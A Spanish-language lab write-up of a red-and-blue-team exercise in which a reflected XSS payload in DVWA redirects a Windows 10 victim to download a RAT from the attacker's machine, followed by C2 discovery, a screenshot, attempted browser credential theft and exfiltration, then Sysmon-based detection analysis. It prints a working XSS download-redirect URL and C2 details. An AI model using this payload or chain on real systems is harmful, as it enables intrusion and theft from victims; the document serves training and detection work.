# Día 6 - Windows 10: Drive-by Compromise + HTML Smuggling (DVWA XSS)

Operación Eslabón, 30 de junio de 2026.

## Objetivo

Ejecutar una cadena completa de ataque contra una víctima Windows 10 mediante drive-by compromise. El vector de entrada es HTML Smuggling embebido en una vulnerabilidad XSS Reflected en DVWA (máquina Ubuntu). El payload descarga un RAT compilado (Documento.exe) que establece conexión C2 y ejecuta discovery del sistema desde una sesión remota.

## Máquinas

Víctima: Windows 10 Pro (192.168.1.183, DESKTOP-ALSOF1R, usuario: analista)  
Atacante: Kali Linux (192.168.1.132)  
Servidor vulnerable: Ubuntu con DVWA (192.168.1.96:8080)  
Monitoreo: Sysmon64, Windows Defender activo, Event Viewer

## Entorno

Windows 10 Pro Build 19045, 8 GB RAM, VirtualBox.  
Sysmon64 monitorea todas las operaciones del sistema (EventID 1 = Process Create, EventID 3 = Network Connect, EventID 11 = File Create).  
Windows Defender (MsMpEng.exe) activo con 348 MB de memoria.  
DVWA en Ubuntu puerto 8080 con vulnerabilidad XSS Reflected sin protección.

## Desarrollo

### Fase 1: Reconnaissance (T1595)

Se identificó que DVWA está expuesto en `http://192.168.1.96:8080/vulnerabilities/xss_r/` con un campo de input sin filtrado de caracteres. La página refleja directamente la entrada del usuario en el parámetro `name` de la URL.

Se verificó que no hay WAF, rate limiting, ni validación de entrada en el cliente o servidor.

### Fase 2: Initial Access (T1189 + T1566.002 — Drive-by Compromise + Phishing - Link)

Se creó un payload XSS que:
1. Inyecta una etiqueta `<img>` con evento `onerror`
2. El JavaScript en `onerror` redirige el navegador a `http://192.168.1.132:8888/Documento.exe`
3. El navegador interpreta la descarga como un archivo binario y la guarda automáticamente en Downloads

**URL maliciosa construida:**

```
http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<img src=x onerror="window.location='http://192.168.1.132:8888/Documento.exe'">
```

**Vector realista:** Atacante envía este link vía email phishing, chat, o publicación en red social. La víctima (usuario `analista`) lo abre en el navegador.

**Resultado:**
```
[servidor HTTP de Kali]
192.168.1.183 - - [30/Jun/2026 12:26:38] "GET /Documento.exe HTTP/1.1" 200 -
```

Archivo descargado: `C:\Users\analista\Downloads\Documento.exe` (48,392,165 bytes)

**Técnicas MITRE:** T1189 (Drive-by Compromise), T1566.002 (Phishing - Link)

### Fase 3: Execution (T1204.002 + T1059 — User Execution + Command Line Interface)

Víctima hace doble clic en Documento.exe. El RAT compilado se inicia con las siguientes acciones simultáneas:

1. **Proceso RAT se ejecuta en background:**
   - PID: 7028
   - User: DESKTOP-ALSOF1R\analista
   - Ubicación: C:\Users\analista\Desktop\Documento.exe
   - Memoria: 349 MB

2. **PDF decoy se abre automáticamente:**
   - Archivo: documento_quo_vadis.pdf (embebido en el .exe)
   - Propósito: Hacer creer al usuario que descargó un documento legítimo
   - El usuario ve el PDF y cierra la ventana, sin saber que un RAT corre en background

3. **Conexión C2 establecida:**
   - RAT conecta a Kali (192.168.1.132:4444) automáticamente
   - Sesión remota establecida en el C2 server
   - En Kali: `[NEW SESSION] ID: 1 → analista@DESKTOP-ALSOF1R (Windows) - 192.168.1.183`

**Técnicas MITRE:** T1204.002 (User Execution - Malicious File), T1059.001 (Command and Scripting Interpreter - PowerShell)

### Fase 4: Discovery (T1082 + T1057 + T1033 + T1046 — System Info, Process List, Owner, Network Service Scanning)

Atacante desde C2 ejecuta comandos de reconnaissance:

**Comando 1: sysinfo**
```
hostname: DESKTOP-ALSOF1R
username: analista
platform: Windows 10 Pro Build 19045
cwd: C:\Users\analista\Desktop
pid: 7028
```

**Comando 2: systeminfo (detallado)**
```
SO: Microsoft Windows 10 Pro
Versión: 10.0.19045 Build 19045
Procesador: AMD64 Family 23 Model 104 (1 CPU, ~1797 MHz)
RAM Total: 8,192 MB (5,190 MB disponible)
Dominio: WORKGROUP (no está en Active Directory)
Patches instalados: 10 (relativamente actualizado)
Tarjeta de red: Intel PRO/1000 MT, IP 192.168.1.183, DHCP habilitado
Hipervisor detectado: VirtualBox
```

**Comando 3: tasklist /v**
- Procesos clave identificados:
  - MsMpEng.exe (348 MB) - Windows Defender activo
  - Sysmon64.exe (22 MB) - Monitoreo activo
  - explorer.exe (180 MB) - File Manager usuario
  - msedge.exe (142 MB) - Navegador en uso
  - Documento.exe (349 MB) - Nuestro RAT
  - Múltiples svchost.exe (servicios Windows)

**Comando 4: ipconfig /all**
```
Adaptador: Ethernet
IPv4: 192.168.1.183
Máscara: 255.255.255.0
Gateway: 192.168.1.254
DHCP: Habilitado
Servidor DHCP: 192.168.1.254
IPv6: Múltiples direcciones activas
```

**Comando 5: netstat -ano (conexiones activas)**
```
Proto  Local Address            Remote Address         State
TCP    192.168.1.183:51030      192.168.1.132:4444     ESTABLISHED ← C2 connection
TCP    192.168.1.183:51090      104.208.16.89:443      ESTABLISHED ← OneDrive
TCP    192.168.1.183:51100      a-0003:80              ESTABLISHED ← Other services
```

**Comando 6: dir C:\**
```
Ubicación actual: C:\Users\analista\Desktop
Archivos visibles:
  - Documento.exe (50,389,815 bytes) ← nuestro RAT
  - Microsoft Edge.lnk (2,350 bytes)
Espacio libre en C:\: 33,139,212,288 bytes
```

**Hallazgos críticos:**
- Sistema Windows 10 actualizado (Build 19045)
- Defender activo (controlable pero requiere evasión)
- Sysmon monitorea el sistema
- No hay Active Directory (máquina workgroup)
- Usuario analista con permisos normales (no admin)
- Conexión a internet activa (DHCP, IPv4 e IPv6)

**Técnicas MITRE:** T1082 (System Information Discovery), T1057 (Process Discovery), T1033 (System Owner/User Discovery), T1046 (Network Service Discovery)

### Fase 5: Credential Access (T1555 — Credentials from Web Browsers)

Se ejecutó comando `harvest_credentials` en el RAT para extraer credenciales almacenadas de navegadores.

**Resultado:**
```
No credentials found
```

Máquina limpia sin contraseñas guardadas en Chrome, Firefox, o Edge. No hay cookies de sesión relevantes tampoco.

**Fallback:** En un escenario real, atacante hubiera ejecutado:
- Volcado de LSASS (T1003) — requiere admin
- Keylogger (T1056.001) — captura entrada del usuario
- Acceso a credential manager (T1555.001)

**Técnicas MITRE:** T1555 (Credentials from Web Browsers), T1555.003 (Credentials from Web Browsers - Chromium/Firefox)

### Fase 6: Collection (T1113 — Screen Capture)

Se ejecutó comando `screenshot` en el RAT para capturar lo que el usuario ve en pantalla.

**Resultado:**
```
[13:07:05] [+] Screenshot saved to screenshot_20260630_130705.png
```

Archivo base64 encoded y transmitido al C2 server en Kali. La imagen captura:
- Fondo de escritorio
- Ventanas abiertas (File Manager, navegador Edge)
- Bandeja de tareas con programas en ejecución
- Información sobre actividad actual del usuario

**Técnicas MITRE:** T1113 (Screen Capture)

### Fase 7: Exfiltration (T1041 — Exfiltration Over C2 Channel)

Todos los datos obtenidos en fases anteriores fueron enviados al C2 server via TCP/4444:

**Datos exfiltrados:**
- Información de sistema (sysinfo JSON)
- Lista de procesos (tasklist output)
- Configuración de red (ipconfig)
- Conexiones activas (netstat)
- Estructura de archivos (dir listing)
- Screenshot en base64
- Intentos de credenciales (aunque vacío)

**Protocolo:** JSON length-prefixed messages sobre TCP sin encriptación.

**Conexión:**
```
TCP    192.168.1.183:51030    192.168.1.132:4444     ESTABLISHED
```

**Técnicas MITRE:** T1041 (Exfiltration Over C2 Channel)

## Técnicas MITRE ATT&CK

| Fase | Técnica | Descripción |
|------|---------|-------------|
| T1595 | Reconnaissance | nmap, banner grabbing, enumeration manual de DVWA |
| T1189 | Initial Access - Drive-by Compromise | HTML Smuggling via XSS Reflected en DVWA |
| T1566.002 | Initial Access - Phishing - Link | URL maliciosa enviada a víctima |
| T1204.002 | Execution - User Execution - Malicious File | Usuario ejecuta Documento.exe |
| T1059.001 | Execution - Command and Scripting Interpreter | RAT ejecuta cmd.exe para comandos |
| T1082 | Discovery - System Information Discovery | systeminfo, wmic, Environment variables |
| T1057 | Discovery - Process Discovery | tasklist /v, Get-Process |
| T1033 | Discovery - System Owner/User Discovery | whoami, id |
| T1046 | Discovery - Network Service Scanning | ipconfig, netstat, arp, route |
| T1555 | Credential Access - Credentials from Web Browsers | harvest_credentials (sin resultados) |
| T1555.003 | Credential Access - Credentials from Web Browsers - Chromium/Firefox | Intento de extracción de contraseñas guardadas |
| T1113 | Collection - Screen Capture | screenshot del escritorio |
| T1041 | Exfiltration - Exfiltration Over C2 Channel | Todos los datos via TCP/4444 sin encriptación |

## Análisis Blue Team (Sysmon Logs)

### EventID 3: Network Connection Detected

**Conexión C2 más relevante:**

```
TimeCreated: 30/06/2026 01:12:15 p.m.
ProviderName: Microsoft-Windows-Sysmon
EventID: 3
ProcessId: 7028
Image: C:\Users\analista\Desktop\Documento.exe
User: DESKTOP-ALSOF1R\analista
Protocol: tcp
SourceIp: 192.168.1.183
SourcePort: 51518
DestinationIp: 192.168.1.132
DestinationPort: 4444
DestinationHostname: -
Initiated: true
```

**Firma de detección Blue Team:**
- Proceso desconocido (Documento.exe) en escritorio usuario
- Conexión outbound a IP privada en puerto 4444 (no standard)
- Sin nombre de host destino resuelto
- Patrón de reconexión cada ~60 segundos (visible en múltiples eventos EventID 3)

**Alerta Defender for Endpoint:**
```
"Suspicious outbound connection from user process to non-standard port 4444"
"Beaconing behavior detected - repeated connections to same destination"
```

### EventID 1: Process Create

**Cadena de procesos maliciosa:**

```
TimeCreated: 30/06/2026 01:05:39 p.m.
ProcessId: 10088
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /c "dir"
ParentImage: C:\Users\analista\Desktop\Documento.exe
ParentProcessId: 7028
User: DESKTOP-ALSOF1R\analista
Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC
```

**Patrón sospechoso:**
- Documento.exe (padre) crea múltiples procesos cmd.exe hijo
- Cada cmd.exe ejecuta un comando diferente: dir, wmic, net, ipconfig, etc.
- Ningún usuario escribió estos comandos en la terminal
- Patrón de discovery automatizado

**Otros procesos hijo de Documento.exe:**
```
CommandLine: C:\Windows\system32\cmd.exe /c "wmic"      [EventID 1, 19:05:25]
CommandLine: C:\Windows\system32\cmd.exe /c "net"       [EventID 1, 19:04:54]
```

**Alerta Defender for Endpoint:**
```
"Process tree anomaly: Unknown executable creating cmd.exe children"
"Living off the land binary (cmd.exe) execution from suspicious parent"
```

### Correlación de eventos

**Timeline de ataque (Sysmon):**

```
12:26:38 - msedge.exe conecta a 192.168.1.96:8080 (DVWA)
12:26:38 - msedge.exe conecta a 192.168.1.132:8888 (descargar .exe)
12:29:00 - Usuario hace clic en Documento.exe
12:31:18 - Documento.exe (PID 7028) conecta a 192.168.1.132:4444 (EventID 3)
01:04:54 - Documento.exe crea cmd.exe /c "net" (EventID 1)
01:05:10 - Documento.exe crea cmd.exe /c "wmic" (EventID 1)
01:05:25 - Documento.exe crea cmd.exe /c "wmic" (EventID 1)
01:05:39 - Documento.exe crea cmd.exe /c "dir" (EventID 1)
01:09:28 - Documento.exe reconecta a 192.168.1.132:4444 (EventID 3)
01:12:15 - Documento.exe reconecta a 192.168.1.132:4444 (EventID 3)
```

**Patrón visible en Sysmon:**
1. Descarga de ejecutable sospechoso
2. Ejecución del ejecutable
3. Conexión outbound inmediata
4. Creación de procesos hijo para discovery
5. Reconexión periódica (beaconing)

### Eventos faltantes (ceguera del SOC)

Defender for Endpoint mostrará alertas, pero:
- No capture las líneas exactas de los comandos discovery (solo nombres de procesos)
- No vea el contenido de las respuestas (eso está en C2, encrypted o no logged)
- No detecte automáticamente "beaconing" sin rules personalizadas
- La reconexión cada 60 segundos puede confundirse con keepalive legítimo si no hay correlación

## Cabos sueltos

**Privilege Escalation:** Atacante es usuario normal (no admin). No se ejecutó escalada. Vectores posibles: UAC bypass (T1548.002), explotación de kernel, etc. Está fuera de scope para Día 6.

**Persistence:** No se implementó persistencia en Día 6. RAT morirá con reboot o si cierra sesión. Día 7+ incluirá Scheduled Task, Registry Run keys, etc.

**Defense Evasion avanzada:** Se usó técnica simple (cmd.exe shell). No se implementó: process injection, AES encryption, HTTPS C2, etc. Defender detectó fácilmente. En escenario real, necesitaría evasión más sofisticada.

**Lateral Movement:** No se ejecutó. Sistema aislado en WORKGROUP.

**Credential harvesting:** Sin credenciales guardadas. En VM con usuario real con contraseñas en Chrome, habría sido más realista.

## Conclusión

Se ejecutó una cadena realista de 7 eslabones contra Windows 10:

1. **Reconnaissance** → Identificó DVWA vulnerable
2. **Initial Access** → HTML Smuggling via XSS
3. **Execution** → RAT conectó a C2
4. **Discovery** → Mapeó sistema, red, procesos
5. **Credential Access** → Intentó harvest (sin resultados)
6. **Collection** → Screenshot capturado
7. **Exfiltration** → Datos via C2 channel

**Perspectiva Blue Team (SOC Analyst):**

El Sysmon capturó la cadena casi perfecta:
- EventID 3 mostró beaconing outbound
- EventID 1 mostró cadena de procesos anómala (Documento.exe → cmd.exe)
- Timeline correlaciona descarga + ejecución + conexión

**Alertas que debería generar en Defender for Endpoint:**
```
1. Suspicious file download (Documento.exe) from web
2. Suspicious file execution (Documento.exe, tamaño 48 MB)
3. Outbound connection to non-standard port 4444
4. Beaconing pattern detected (repeated connections)
5. Process tree anomaly (unknown .exe creating cmd.exe children)
6. Discovery commands executed via cmd.exe (systeminfo, tasklist, ipconfig, etc.)
```
